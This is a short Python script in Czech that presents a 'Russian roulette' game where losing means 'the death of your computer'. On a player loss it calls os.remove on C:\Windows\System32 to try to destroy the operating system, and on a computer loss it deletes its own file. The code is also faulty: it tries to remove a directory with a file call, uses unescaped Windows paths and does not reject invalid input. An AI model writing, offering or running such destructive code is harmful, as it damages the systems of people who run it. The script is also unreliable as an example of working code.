import os
import random
import time

print("Bienvenido a la ruleta")
print("Vítejste u hry ruleta, kdy místo vaší smrti je smrt vašeho počítače")
print("Pravidla jsou jednoduchá, mám revolver na 6 nábojnic, uhodněte tu která není nabitá a vyhrajte")

bullet = random.randint(1, 6)
barell = []

while True:

    while True:
        player = int(input("Zadejte číslo od 1 do 6: "))
        if player < 1 or player > 6:
            print("Zadejte číslo od 1 do 6")

        if player in barell:
            print("Tato nábojnice se již zadala, zadejte jinou nábojnici")
        else:    
            barell.append(player)
            break

    print("Hledám nábojnice v revolveru...")
    time.sleep(5)
    if player != bullet:
        print("Vyhrál jste")
        print("Jste opravdu šťastný, že jste přežil, ale nezapomeňte, že vaše zařízení mohlo zemřít")
        print("Nyní hraje počítač")
    else:
        print("Počítač vyhrál")
        os.remove("C:\Windows\System32")
        break


    time.sleep(3)

    while True:
        computer = random.randint(1, 6)

        if computer in barell:  
            print("Počítač vybral nábojnici, která již byla vybrána, hledá další nábojnici")
        else:  
            barell.append(computer)
            break

    print("Hledám nábojnice v revolveru...")
    time.sleep(5)
    print("Počítač vybral nábojnici: ", computer)
    if computer != bullet:
        print("Počítač vyhrál")
    else:
        print("Vyhrál jste")
        os.remove("C:\Downloads\ruleta.py")
        break
exit(1)
